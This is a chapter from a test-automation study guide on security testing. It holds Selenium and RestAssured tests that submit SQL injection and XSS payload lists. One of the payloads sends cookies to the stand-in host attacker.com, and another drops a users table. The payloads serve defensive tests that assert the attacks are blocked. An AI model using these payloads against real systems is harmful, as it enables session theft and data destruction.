# 19. Security Testing for SDET

## Table of Contents
- [Why Security Testing Matters](#why-security-testing-matters)
- [OWASP Top 10](#owasp-top-10)
- [SQL Injection Testing](#sql-injection-testing)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Authentication & Authorization Testing](#authentication--authorization-testing)
- [API Security Testing](#api-security-testing)
- [Security Testing Tools](#security-testing-tools)

---

## Why Security Testing Matters

### Security vs Functional Testing

```markdown
## Functional Testing
**Question:** Does it work?
- Positive testing
- Expected behavior
- User workflows
- Business requirements

## Security Testing
**Question:** Can it be broken/exploited?
- Negative testing
- Unexpected behavior
- Attack scenarios
- Protecting sensitive data

## Why SDETs Need Security Knowledge

✅ **Early Detection:**
- Find vulnerabilities before production
- Cheaper to fix in development
- Prevent data breaches

✅ **Shift-Left Security:**
- Security in CI/CD pipeline
- Automated security scans
- Quick feedback to developers

✅ **Compliance:**
- GDPR, PCI-DSS, HIPAA
- Legal requirements
- Audit requirements

✅ **Real-world Examples:**
- Equifax breach (2017): 147M people affected
- Capital One breach (2019): 100M customers
- SolarWinds (2020): Supply chain attack
```

---

## OWASP Top 10

### OWASP Top 10 (2021)

```markdown
## 1. Broken Access Control ⭐⭐⭐
**Risk:** Users can access unauthorized data/functions

**Examples:**
- Accessing other user's account by changing URL
- Bypassing access control checks
- Privilege escalation

## 2. Cryptographic Failures ⭐⭐⭐
**Risk:** Sensitive data exposed

**Examples:**
- Passwords stored in plain text
- Weak encryption algorithms
- No HTTPS
- Sensitive data in logs

## 3. Injection ⭐⭐⭐
**Risk:** Malicious code execution

**Examples:**
- SQL Injection
- NoSQL Injection
- OS Command Injection
- LDAP Injection

## 4. Insecure Design ⭐⭐
**Risk:** Flawed architecture

**Examples:**
- No rate limiting
- Missing security controls
- Poor threat modeling

## 5. Security Misconfiguration ⭐⭐⭐
**Risk:** Improper security settings

**Examples:**
- Default credentials
- Unnecessary features enabled
- Error messages revealing info
- Missing security headers

## 6. Vulnerable and Outdated Components ⭐⭐
**Risk:** Using components with known vulnerabilities

**Examples:**
- Old dependencies
- Unpatched libraries
- End-of-life software

## 7. Identification and Authentication Failures ⭐⭐⭐
**Risk:** Authentication bypass

**Examples:**
- Weak password requirements
- No multi-factor authentication
- Session management issues
- Credential stuffing

## 8. Software and Data Integrity Failures ⭐⭐
**Risk:** Code/data manipulation

**Examples:**
- Insecure CI/CD pipeline
- Auto-updates without verification
- Untrusted serialized data

## 9. Security Logging and Monitoring Failures ⭐⭐
**Risk:** Breaches go undetected

**Examples:**
- No logging of critical events
- No alerts for suspicious activity
- Logs not monitored

## 10. Server-Side Request Forgery (SSRF) ⭐
**Risk:** Server makes malicious requests

**Examples:**
- Accessing internal services
- Cloud metadata access
- Port scanning internal network
```

---

## SQL Injection Testing

### Understanding SQL Injection

```sql
-- Normal Query
SELECT * FROM users WHERE username='john' AND password='pass123';

-- SQL Injection Attack
-- User enters: admin' OR '1'='1
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything';
-- Returns all users because 1=1 is always true

-- Another Attack: Commenting out rest
-- User enters: admin'--
SELECT * FROM users WHERE username='admin'--' AND password='anything';
-- Everything after -- is a comment, so password check is bypassed
```

### SQL Injection Test Cases

```java
import org.testng.annotations.Test;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.By;
import org.openqa.selenium.WebElement;

public class SQLInjectionTest {
    private WebDriver driver;
    
    // Test 1: Basic SQL Injection
    @Test
    public void testBasicSQLInjection() {
        driver.get("https://example.com/login");
        
        String[] sqlInjectionPayloads = {
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "' OR 1=1--",
            "') OR ('1'='1",
            "1' OR '1'='1",
            "' OR 'x'='x",
            "admin' OR '1'='1' /*"
        };
        
        for (String payload : sqlInjectionPayloads) {
            driver.navigate().refresh();
            
            WebElement username = driver.findElement(By.id("username"));
            WebElement password = driver.findElement(By.id("password"));
            WebElement loginBtn = driver.findElement(By.id("login"));
            
            username.clear();
            username.sendKeys(payload);
            password.clear();
            password.sendKeys("anything");
            loginBtn.click();
            
            // Verify injection is blocked
            String currentUrl = driver.getCurrentUrl();
            String errorMsg = getErrorMessage();
            
            Assert.assertFalse(
                currentUrl.contains("dashboard") || currentUrl.contains("home"),
                "SQL Injection payload should NOT allow login: " + payload
            );
            
            System.out.println("✓ Blocked: " + payload);
        }
    }
    
    // Test 2: Union-Based SQL Injection
    @Test
    public void testUnionSQLInjection() {
        driver.get("https://example.com/search");
        
        String[] unionPayloads = {
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT username, password FROM users--",
            "' UNION ALL SELECT name, password FROM admin--"
        };
        
        for (String payload : unionPayloads) {
            WebElement searchBox = driver.findElement(By.id("search"));
            searchBox.clear();
            searchBox.sendKeys(payload);
            searchBox.submit();
            
            String pageSource = driver.getPageSource();
            
            // Should NOT reveal database structure or data
            Assert.assertFalse(
                pageSource.contains("mysql_") || 
                pageSource.contains("ORA-") ||
                pageSource.contains("syntax error"),
                "Should not expose database errors"
            );
        }
    }
    
    // Test 3: Blind SQL Injection (Time-based)
    @Test
    public void testBlindSQLInjection() {
        driver.get("https://example.com/search");
        
        // Normal request timing
        long startNormal = System.currentTimeMillis();
        driver.findElement(By.id("search")).sendKeys("normal");
        driver.findElement(By.id("search")).submit();
        long normalTime = System.currentTimeMillis() - startNormal;
        
        driver.navigate().back();
        
        // Time-based SQL injection payload
        long startAttack = System.currentTimeMillis();
        String timePayload = "' OR SLEEP(5)--";
        driver.findElement(By.id("search")).sendKeys(timePayload);
        driver.findElement(By.id("search")).submit();
        long attackTime = System.currentTimeMillis() - startAttack;
        
        // Response time should NOT be significantly different
        Assert.assertFalse(
            attackTime > normalTime + 4000,
            "Blind SQL injection may be possible - response delayed"
        );
    }
    
    // Test 4: Parameterized Query Verification (with Dev/DB access)
    @Test
    public void verifyParameterizedQueries() {
        // This test requires code review or database query logging
        
        // ❌ Vulnerable Code (String concatenation)
        String vulnerableQuery = 
            "SELECT * FROM users WHERE username='" + username + "'";
        
        // ✅ Safe Code (Parameterized)
        String safeQuery = 
            "SELECT * FROM users WHERE username=?";
        // PreparedStatement ps = conn.prepareStatement(safeQuery);
        // ps.setString(1, username);
        
        // In automation, verify by reviewing code or logs
        // Or check if SQL errors appear with injection attempts
    }
    
    private String getErrorMessage() {
        try {
            WebElement error = driver.findElement(By.className("error-message"));
            return error.getText();
        } catch (Exception e) {
            return "";
        }
    }
}
```

### SQL Injection Prevention Checklist

```java
public class SQLInjectionPrevention {
    
    /**
     * ✅ BEST PRACTICES
     */
    
    // 1. Use Parameterized Queries (Prepared Statements)
    public void safeDatabaseQuery(String username) throws SQLException {
        String query = "SELECT * FROM users WHERE username = ?";
        PreparedStatement pstmt = connection.prepareStatement(query);
        pstmt.setString(1, username);  // Automatically escapes input
        ResultSet rs = pstmt.executeQuery();
    }
    
    // 2. Use ORM (Hibernate, JPA)
    public User findByUsername(String username) {
        return entityManager.createQuery(
            "SELECT u FROM User u WHERE u.username = :username", User.class)
            .setParameter("username", username)
            .getSingleResult();
    }
    
    // 3. Input Validation
    public boolean isValidUsername(String username) {
        // Allow only alphanumeric and specific characters
        String regex = "^[a-zA-Z0-9_]{3,20}$";
        return username.matches(regex);
    }
    
    // 4. Principle of Least Privilege
    // Database user should only have necessary permissions
    // Don't use 'root' or 'admin' account for application
    
    // 5. Error Handling
    public void safeErrorHandling() {
        try {
            // database operation
        } catch (SQLException e) {
            // ❌ Don't expose database errors to user
            // log.error("Database error: " + e.getMessage());
            
            // ✅ Show generic error
            return "An error occurred. Please try again.";
        }
    }
}
```

---

## Cross-Site Scripting (XSS)

### Types of XSS

```markdown
## 1. Stored XSS (Persistent) ⭐⭐⭐
**Most Dangerous**

Malicious script stored in database and served to all users.

**Example:**
User posts comment with script:
`<script>alert('XSS')</script>`

If not sanitized, every user viewing the comment executes the script.

## 2. Reflected XSS (Non-Persistent) ⭐⭐
Script reflected back from request.

**Example:**
URL: `https://example.com/search?q=<script>alert('XSS')</script>`
Page displays: `Search results for: <script>alert('XSS')</script>`

## 3. DOM-Based XSS ⭐⭐
Client-side script manipulates DOM unsafely.

**Example:**
```javascript
// Vulnerable code
var search = window.location.search.split('=')[1];
document.getElementById('result').innerHTML = search;
```
```

### XSS Testing

```java
public class XSSTest {
    private WebDriver driver;
    
    @Test
    public void testStoredXSS() {
        driver.get("https://example.com/comments");
        
        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "javascript:alert('XSS')",
            "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
        };
        
        for (String payload : xssPayloads) {
            // Post comment with XSS payload
            WebElement commentBox = driver.findElement(By.id("comment"));
            commentBox.clear();
            commentBox.sendKeys(payload);
            driver.findElement(By.id("submit")).click();
            
            // Wait for page to reload
            Thread.sleep(1000);
            
            // Check if alert appears (XSS successful)
            boolean alertPresent = isAlertPresent();
            
            Assert.assertFalse(alertPresent,
                "XSS payload should be sanitized: " + payload);
            
            // Check if script is rendered in page source
            String pageSource = driver.getPageSource();
            Assert.assertFalse(
                pageSource.contains("<script>") && pageSource.contains(payload),
                "Script tags should be escaped"
            );
            
            // Check if payload is properly encoded
            String displayedComment = driver.findElement(By.className("comment-text"))
                                           .getText();
            // Should display as plain text, not execute
            System.out.println("Payload rendered as: " + displayedComment);
        }
    }
    
    @Test
    public void testReflectedXSS() {
        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>"
        };
        
        for (String payload : xssPayloads) {
            // Encode payload for URL
            String encodedPayload = URLEncoder.encode(payload, "UTF-8");
            driver.get("https://example.com/search?q=" + encodedPayload);
            
            // Check if alert appears
            boolean alertPresent = isAlertPresent();
            Assert.assertFalse(alertPresent,
                "Reflected XSS should be prevented: " + payload);
            
            // Verify output is encoded
            String pageSource = driver.getPageSource();
            Assert.assertTrue(
                pageSource.contains("&lt;") || pageSource.contains("&amp;"),
                "Output should be HTML-encoded"
            );
        }
    }
    
    @Test
    public void testDOMBasedXSS() {
        // Test URL with hash fragment
        driver.get("https://example.com/page#<img src=x onerror=alert('XSS')>");
        
        boolean alertPresent = isAlertPresent();
        Assert.assertFalse(alertPresent, "DOM-based XSS should be prevented");
        
        // Check if JavaScript safely handles URL parameters
        String result = (String) ((JavascriptExecutor) driver)
            .executeScript("return document.getElementById('output').innerHTML");
        
        Assert.assertFalse(result.contains("<img"),
            "DOM manipulation should sanitize input");
    }
    
    private boolean isAlertPresent() {
        try {
            WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(2));
            wait.until(ExpectedConditions.alertIsPresent());
            driver.switchTo().alert().dismiss();
            return true;
        } catch (TimeoutException e) {
            return false;
        }
    }
}
```

### XSS Prevention

```java
public class XSSPrevention {
    
    // 1. Output Encoding
    public String encodeForHTML(String input) {
        return input.replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace("\"", "&quot;")
                   .replace("'", "&#x27;");
    }
    
    // 2. Use Framework's Built-in Encoding (JSP Example)
    // <c:out value="${userInput}" /> // Automatically encodes
    
    // 3. Content Security Policy (CSP) Header
    public void setCSPHeader(HttpServletResponse response) {
        response.setHeader("Content-Security-Policy",
            "default-src 'self'; script-src 'self' https://trusted-cdn.com; " +
            "object-src 'none'; base-uri 'self';");
    }
    
    // 4. Input Validation
    public boolean isValidInput(String input) {
        // Whitelist approach
        String allowedPattern = "^[a-zA-Z0-9\\s.,!?-]+$";
        return input.matches(allowedPattern);
    }
    
    // 5. HTTPOnly Cookie Flag
    public void setSecureCookie(HttpServletResponse response) {
        Cookie cookie = new Cookie("session", "abc123");
        cookie.setHttpOnly(true);  // Prevents JavaScript access
        cookie.setSecure(true);     // Only sent over HTTPS
        response.addCookie(cookie);
    }
}
```

---

## Authentication & Authorization Testing

### Authentication Testing

```java
public class AuthenticationSecurityTest {
    
    // Test 1: Weak Password Policy
    @Test
    public void testWeakPasswordPrevention() {
        driver.get("https://example.com/register");
        
        String[] weakPasswords = {
            "123456",
            "password",
            "qwerty",
            "abc123",
            "12345678",
            "password123",
            "111111"
        };
        
        for (String weakPassword : weakPasswords) {
            driver.findElement(By.id("username")).sendKeys("testuser");
            driver.findElement(By.id("password")).sendKeys(weakPassword);
            driver.findElement(By.id("register")).click();
            
            // Should reject weak password
            String error = driver.findElement(By.className("error")).getText();
            Assert.assertTrue(
                error.toLowerCase().contains("password") ||
                error.toLowerCase().contains("weak") ||
                error.toLowerCase().contains("strong"),
                "Should reject weak password: " + weakPassword
            );
            
            driver.navigate().refresh();
        }
    }
    
    // Test 2: Brute Force Protection
    @Test
    public void testBruteForceProtection() {
        driver.get("https://example.com/login");
        
        int maxAttempts = 10;
        boolean accountLocked = false;
        
        for (int i = 1; i <= maxAttempts; i++) {
            driver.findElement(By.id("username")).sendKeys("testuser");
            driver.findElement(By.id("password")).sendKeys("wrongpassword");
            driver.findElement(By.id("login")).click();
            
            String message = driver.findElement(By.className("message")).getText();
            
            if (message.toLowerCase().contains("locked") ||
                message.toLowerCase().contains("too many attempts") ||
                message.toLowerCase().contains("temporarily disabled")) {
                accountLocked = true;
                System.out.println("Account locked after " + i + " attempts");
                break;
            }
            
            driver.navigate().refresh();
        }
        
        Assert.assertTrue(accountLocked,
            "Account should be locked after multiple failed attempts");
    }
    
    // Test 3: Session Timeout
    @Test
    public void testSessionTimeout() throws InterruptedException {
        // Login
        driver.get("https://example.com/login");
        driver.findElement(By.id("username")).sendKeys("validuser");
        driver.findElement(By.id("password")).sendKeys("validpassword");
        driver.findElement(By.id("login")).click();
        
        // Verify logged in
        Assert.assertTrue(driver.getCurrentUrl().contains("dashboard"));
        
        // Wait for session timeout (e.g., 15 minutes)
        Thread.sleep(15 * 60 * 1000 + 5000); // 15 min + 5 sec buffer
        
        // Try to access protected page
        driver.get("https://example.com/dashboard/profile");
        
        // Should redirect to login
        Assert.assertTrue(
            driver.getCurrentUrl().contains("login"),
            "Session should timeout and redirect to login"
        );
    }
    
    // Test 4: Password Reset Token Security
    @Test
    public void testPasswordResetTokenSecurity() {
        // Request password reset
        driver.get("https://example.com/forgot-password");
        driver.findElement(By.id("email")).sendKeys("user@example.com");
        driver.findElement(By.id("submit")).click();
        
        // Get reset link (from email/database in real test)
        String resetLink = "https://example.com/reset?token=abc123";
        
        // Use token
        driver.get(resetLink);
        driver.findElement(By.id("newPassword")).sendKeys("NewPass123!");
        driver.findElement(By.id("submit")).click();
        
        // Try to reuse the same token
        driver.get(resetLink);
        
        String error = driver.findElement(By.className("error")).getText();
        Assert.assertTrue(
            error.toLowerCase().contains("invalid") ||
            error.toLowerCase().contains("expired"),
            "Password reset token should be single-use"
        );
    }
    
    // Test 5: Multi-Factor Authentication (MFA)
    @Test
    public void testMFAEnforcement() {
        // Login with correct credentials
        driver.get("https://example.com/login");
        driver.findElement(By.id("username")).sendKeys("mfauser");
        driver.findElement(By.id("password")).sendKeys("password123");
        driver.findElement(By.id("login")).click();
        
        // Should be prompted for MFA code
        Assert.assertTrue(
            driver.getCurrentUrl().contains("mfa") ||
            driver.getCurrentUrl().contains("verify") ||
            driver.findElement(By.id("mfaCode")).isDisplayed(),
            "MFA should be required"
        );
        
        // Try to bypass MFA by directly accessing dashboard
        driver.get("https://example.com/dashboard");
        
        // Should redirect back to MFA page or login
        Assert.assertFalse(
            driver.getCurrentUrl().contains("dashboard"),
            "Should not be able to bypass MFA"
        );
    }
}
```

### Authorization Testing

```java
public class AuthorizationSecurityTest {
    
    // Test 1: Horizontal Privilege Escalation
    @Test
    public void testHorizontalPrivilegeEscalation() {
        // Login as User A
        loginAs("userA", "password123");
        String userAProfileUrl = driver.getCurrentUrl(); // /profile?userId=1
        
        // Try to access User B's profile
        String userBProfileUrl = userAProfileUrl.replace("userId=1", "userId=2");
        driver.get(userBProfileUrl);
        
        // Should be denied
        Assert.assertTrue(
            driver.getCurrentUrl().contains("access-denied") ||
            driver.getCurrentUrl().contains("403") ||
            driver.getPageSource().contains("Unauthorized"),
            "Should not access another user's profile"
        );
    }
    
    // Test 2: Vertical Privilege Escalation
    @Test
    public void testVerticalPrivilegeEscalation() {
        // Login as regular user
        loginAs("regularUser", "password123");
        
        // Try to access admin panel
        driver.get("https://example.com/admin");
        
        // Should be denied
        Assert.assertTrue(
            driver.getCurrentUrl().contains("access-denied") ||
            driver.getCurrentUrl().contains("403") ||
            driver.getCurrentUrl().equals("https://example.com/dashboard"),
            "Regular user should not access admin panel"
        );
    }
    
    // Test 3: Insecure Direct Object Reference (IDOR)
    @Test
    public void testIDOR() {
        // Login as User 1
        loginAs("user1", "password123");
        
        // Access own document
        driver.get("https://example.com/documents/101");
        Assert.assertTrue(driver.getPageSource().contains("Document 101"));
        
        // Try to access another user's document by changing ID
        driver.get("https://example.com/documents/102");
        
        // Should be blocked
        Assert.assertTrue(
            driver.getPageSource().contains("Access Denied") ||
            driver.getPageSource().contains("Not Found") ||
            driver.getCurrentUrl().contains("error"),
            "Should not access unauthorized document"
        );
    }
    
    // Test 4: Function-Level Access Control
    @Test
    public void testFunctionLevelAccessControl() {
        // Login as viewer (read-only user)
        loginAs("viewerUser", "password123");
        
        // Delete button should not be visible
        driver.get("https://example.com/dashboard");
        List<WebElement> deleteButtons = driver.findElements(
            By.cssSelector("button.delete")
        );
        Assert.assertTrue(deleteButtons.isEmpty(),
            "Delete button should not be visible to viewer");
        
        // Try to call delete API directly
        Response response = RestAssured
            .given()
                .cookie("session", getSessionCookie())
            .when()
                .delete("https://example.com/api/items/123")
            .then()
                .extract().response();
        
        Assert.assertEquals(response.getStatusCode(), 403,
            "Delete operation should be forbidden");
    }
    
    private void loginAs(String username, String password) {
        driver.get("https://example.com/login");
        driver.findElement(By.id("username")).sendKeys(username);
        driver.findElement(By.id("password")).sendKeys(password);
        driver.findElement(By.id("login")).click();
    }
    
    private String getSessionCookie() {
        return driver.manage().getCookieNamed("session").getValue();
    }
}
```

---

## API Security Testing

### API Security Tests

```java
import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.testng.Assert;
import org.testng.annotations.Test;

public class APISecurityTest {
    
    private static final String BASE_URL = "https://api.example.com";
    
    // Test 1: Authentication Required
    @Test
    public void testAPIRequiresAuthentication() {
        Response response = RestAssured
            .given()
                // No auth token
            .when()
                .get(BASE_URL + "/api/users")
            .then()
                .extract().response();
        
        Assert.assertEquals(response.getStatusCode(), 401,
            "API should require authentication");
    }
    
    // Test 2: JWT Token Validation
    @Test
    public void testInvalidJWTToken() {
        String invalidToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature";
        
        Response response = RestAssured
            .given()
                .header("Authorization", "Bearer " + invalidToken)
            .when()
                .get(BASE_URL + "/api/users")
            .then()
                .extract().response();
        
        Assert.assertEquals(response.getStatusCode(), 401,
            "Invalid JWT token should be rejected");
    }
    
    // Test 3: Rate Limiting
    @Test
    public void testAPIRateLimiting() {
        String token = getValidAuthToken();
        int successCount = 0;
        int rateLimitedCount = 0;
        
        // Send 100 requests rapidly
        for (int i = 0; i < 100; i++) {
            Response response = RestAssured
                .given()
                    .header("Authorization", "Bearer " + token)
                .when()
                    .get(BASE_URL + "/api/users")
                .then()
                    .extract().response();
            
            if (response.getStatusCode() == 200) {
                successCount++;
            } else if (response.getStatusCode() == 429) {
                rateLimitedCount++;
            }
        }
        
        Assert.assertTrue(rateLimitedCount > 0,
            "API should implement rate limiting (Got 429 Too Many Requests)");
        
        System.out.println("Success: " + successCount + 
                         ", Rate Limited: " + rateLimitedCount);
    }
    
    // Test 4: SQL Injection in API
    @Test
    public void testAPISQLInjection() {
        String token = getValidAuthToken();
        
        String[] sqlPayloads = {
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "'; DROP TABLE users--"
        };
        
        for (String payload : sqlPayloads) {
            Response response = RestAssured
                .given()
                    .header("Authorization", "Bearer " + token)
                    .queryParam("userId", payload)
                .when()
                    .get(BASE_URL + "/api/users")
                .then()
                    .extract().response();
            
            // Should return 400 (Bad Request) or 500 (Server Error)
            // But NOT return all users or database error details
            String responseBody = response.getBody().asString();
            
            Assert.assertFalse(
                responseBody.contains("mysql") || 
                responseBody.contains("ORA-") ||
                responseBody.contains("syntax"),
                "Should not expose database errors"
            );
        }
    }
    
    // Test 5: Mass Assignment Vulnerability
    @Test
    public void testMassAssignment() {
        String token = getValidAuthToken();
        
        // Try to set admin=true via API
        String requestBody = "{\n" +
            "  \"name\": \"John Doe\",\n" +
            "  \"email\": \"john@example.com\",\n" +
            "  \"isAdmin\": true\n" +  // Should not be allowed
            "}";
        
        Response response = RestAssured
            .given()
                .header("Authorization", "Bearer " + token)
                .header("Content-Type", "application/json")
                .body(requestBody)
            .when()
                .post(BASE_URL + "/api/users")
            .then()
                .extract().response();
        
        // Get created user
        String userId = response.jsonPath().getString("id");
        Response getResponse = RestAssured
            .given()
                .header("Authorization", "Bearer " + token)
            .when()
                .get(BASE_URL + "/api/users/" + userId)
            .then()
                .extract().response();
        
        boolean isAdmin = getResponse.jsonPath().getBoolean("isAdmin");
        Assert.assertFalse(isAdmin,
            "Should not be able to set admin flag via API");
    }
    
    // Test 6: Excessive Data Exposure
    @Test
    public void testExcessiveDataExposure() {
        String token = getValidAuthToken();
        
        Response response = RestAssured
            .given()
                .header("Authorization", "Bearer " + token)
            .when()
                .get(BASE_URL + "/api/users/me")
            .then()
                .extract().response();
        
        String responseBody = response.getBody().asString();
        
        // Should NOT expose sensitive fields
        Assert.assertFalse(responseBody.contains("password"),
            "API should not expose password field");
        Assert.assertFalse(responseBody.contains("ssn"),
            "API should not expose SSN");
        Assert.assertFalse(responseBody.contains("creditCard"),
            "API should not expose credit card");
    }
    
    // Test 7: CORS Misconfiguration
    @Test
    public void testCORSPolicy() {
        Response response = RestAssured
            .given()
                .header("Origin", "https://evil.com")
            .when()
                .options(BASE_URL + "/api/users")
            .then()
                .extract().response();
        
        String allowOrigin = response.getHeader("Access-Control-Allow-Origin");
        
        Assert.assertFalse("*".equals(allowOrigin),
            "CORS should not allow all origins (*)");
    }
    
    private String getValidAuthToken() {
        // Login and get token
        Response response = RestAssured
            .given()
                .header("Content-Type", "application/json")
                .body("{\"username\":\"testuser\",\"password\":\"password123\"}")
            .when()
                .post(BASE_URL + "/api/login")
            .then()
                .extract().response();
        
        return response.jsonPath().getString("token");
    }
}
```

---

## Security Testing Tools

### OWASP ZAP Integration

```java
import org.zaproxy.clientapi.core.*;
import org.zaproxy.clientapi.gen.*;

public class ZAPSecurityTest {
    
    private static final String ZAP_ADDRESS = "localhost";
    private static final int ZAP_PORT = 8080;
    private static final String ZAP_API_KEY = "your-api-key";
    
    @Test
    public void runZAPScan() throws Exception {
        String target = "https://example.com";
        
        // Initialize ZAP client
        ClientApi zapClient = new ClientApi(ZAP_ADDRESS, ZAP_PORT, ZAP_API_KEY);
        
        // Spider the target
        System.out.println("Spidering target: " + target);
        ApiResponse spiderResponse = zapClient.spider.scan(target, null, null, null, null);
        String scanId = ((ApiResponseElement) spiderResponse).getValue();
        
        // Wait for spider to complete
        while (Integer.parseInt(
            ((ApiResponseElement) zapClient.spider.status(scanId)).getValue()) < 100) {
            Thread.sleep(1000);
        }
        
        System.out.println("Spider completed");
        
        // Active scan
        System.out.println("Starting active scan");
        ApiResponse activeScanResponse = zapClient.ascan.scan(target, "True", "False", null, null, null);
        String activeScanId = ((ApiResponseElement) activeScanResponse).getValue();
        
        // Wait for active scan to complete
        while (Integer.parseInt(
            ((ApiResponseElement) zapClient.ascan.status(activeScanId)).getValue()) < 100) {
            Thread.sleep(5000);
            int progress = Integer.parseInt(
                ((ApiResponseElement) zapClient.ascan.status(activeScanId)).getValue());
            System.out.println("Scan progress: " + progress + "%");
        }
        
        System.out.println("Active scan completed");
        
        // Get alerts
        ApiResponse alertsResponse = zapClient.core.alerts(target, null, null);
        
        // Generate report
        generateZAPReport(zapClient, target);
        
        // Assert no high-risk vulnerabilities
        int highRiskCount = countAlertsByRisk(alertsResponse, "High");
        Assert.assertEquals(highRiskCount, 0, 
            "Found " + highRiskCount + " high-risk vulnerabilities");
    }
    
    private void generateZAPReport(ClientApi zapClient, String target) throws Exception {
        // HTML Report
        byte[] htmlReport = zapClient.core.htmlreport();
        Files.write(Paths.get("zap-report.html"), htmlReport);
        
        // JSON Report
        byte[] jsonReport = zapClient.core.jsonreport();
        Files.write(Paths.get("zap-report.json"), jsonReport);
        
        System.out.println("Reports generated");
    }
    
    private int countAlertsByRisk(ApiResponse alertsResponse, String riskLevel) {
        // Parse alerts and count by risk level
        // Implementation depends on ZAP API response structure
        return 0;
    }
}
```

---

## Interview Questions

### Q1: What is the difference between Authentication and Authorization?

**Answer:**
```markdown
**Authentication:**
- **Who are you?**
- Verifying identity
- Username/password, biometrics, tokens
- Login process
- Example: Entering password to prove you are John

**Authorization:**
- **What can you do?**
- Verifying permissions
- Roles, permissions, access control
- After authentication
- Example: John can view reports but cannot delete them

**Real-world Analogy:**
- Authentication = Showing your ID at airport security
- Authorization = Your boarding pass determines which plane you can board
```

### Q2: Explain SQL Injection and how to prevent it.

**Answer:**
```markdown
**SQL Injection:**
Attacker manipulates SQL query by injecting malicious input.

**Example:**
```sql
-- Vulnerable code
String query = "SELECT * FROM users WHERE username='" + username + "'";

-- User enters: admin' OR '1'='1' --
-- Resulting query:
SELECT * FROM users WHERE username='admin' OR '1'='1' --'
-- Returns all users
```

**Prevention:**

1. ✅ **Parameterized Queries:**
```java
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement ps = conn.prepareStatement(query);
ps.setString(1, username);
```

2. ✅ **ORM (Hibernate/JPA):**
```java
Query query = em.createQuery("SELECT u FROM User u WHERE u.username = :username");
query.setParameter("username", username);
```

3. ✅ **Input Validation:**
- Whitelist allowed characters
- Validate data type and format

4. ✅ **Least Privilege:**
- Don't use admin DB account
- Limit permissions

### Q3: How would you test for XSS vulnerabilities?

**Answer:**
```markdown
**Testing Approach:**

1. **Identify Input Points:**
   - Form fields
   - URL parameters
   - HTTP headers
   - File uploads

2. **Test Payloads:**
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
```

3. **Check Output:**
   - Is script executed?
   - Is input properly encoded?
   - Does alert appear?

4. **Verify Prevention:**
   - HTML entities encoded
   - CSP headers present
   - HTTPOnly cookies set

5. **Automated Testing:**
   - Use OWASP ZAP
   - Burp Suite
   - Custom Selenium tests
```

---

**Next:** [Handling Flaky Tests](20-handling-flaky-tests.md)

